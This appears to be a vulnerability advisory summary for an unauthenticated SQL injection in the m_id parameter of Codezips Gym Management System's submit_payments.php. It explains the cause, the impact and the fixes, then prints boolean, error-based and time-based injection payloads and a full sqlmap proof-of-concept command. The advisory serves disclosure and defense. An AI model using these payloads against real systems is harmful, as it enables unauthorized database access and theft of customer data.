- **vector:** manipulation of m_id argument
- **product:** Codezips Gym Management System
- **version:** 1
- **component:** /dashboard/admin/submit_payments.php

## CVE Reference Links Content Summary
The content is related to a SQL Injection vulnerability in Gym Management System (PHP) v1.0. It provides more detail than a typical CVE description.

**Root cause of vulnerability:**
The vulnerability exists due to a lack of proper input validation and sanitization of the `m_id` parameter in the `/dashboard/admin/submit_payments.php` file. This allows attackers to inject arbitrary SQL code.

**Weaknesses/vulnerabilities present:**
- SQL Injection
  - Boolean-based blind
  - Error-based
  - Time-based blind

**Impact of exploitation:**
- Database Compromise (read, modify, or delete data)
- Data Leakage (sensitive customer/payment information)
- System Interruption (performance degradation or application crash)
- Privilege Escalation (potential system takeover)

**Attack vectors:**
- The vulnerability is exploitable without authentication.
- Attackers can send specially crafted values to the `m_id` parameter in the `/dashboard/admin/submit_payments.php` file.

**Required attacker capabilities/position:**
- No authentication is required.
- Attacker needs to be able to send HTTP requests to the vulnerable endpoint.
- Knowledge of SQL injection techniques and tools (e.g., sqlmap) is beneficial.

**Mitigation or fix:**
1. Use Prepared Statements / Parameter Binding
2. Enforce Strict Input Validation
3. Apply the Principle of Least Privilege
4. Schedule Regular Security Audits

**Sample Payloads:**
```
# Boolean-based blind
m_id=1529336794' (SELECT 0x51445246 WHERE 6436=6436 AND 6070=6070) '&u_name=...

# Error-based
m_id=1529336794' (SELECT 0x596b6f44 WHERE 1640=1640 AND GTID_SUBSET(CONCAT(...))) '&u_name=...

# Time-based blind
m_id=1529336794' (SELECT 0x666b4647 WHERE 6352=6352 AND (SELECT 7581 FROM (SELECT(SLEEP(5)))yUTW)) '&u_name=...
```

**Proof of Concept (PoC):**
```
sqlmap -u "192.168.31.237:2227/dashboard/admin/submit_payments.php" \
       --data="m_id=1529336794&u_name=Christiana+Mayberry&prevPlan=Monthly+Plan&plan=POQKJC&submit=ADD+PAYMENT" \
       --batch --level=5 --risk=3 --dbms=mysql \
       --random-agent --tamper=space2comment \
       --cookie="PHPSESSID=jgr5ojsmnmoupjk3r2nrdk5n85"
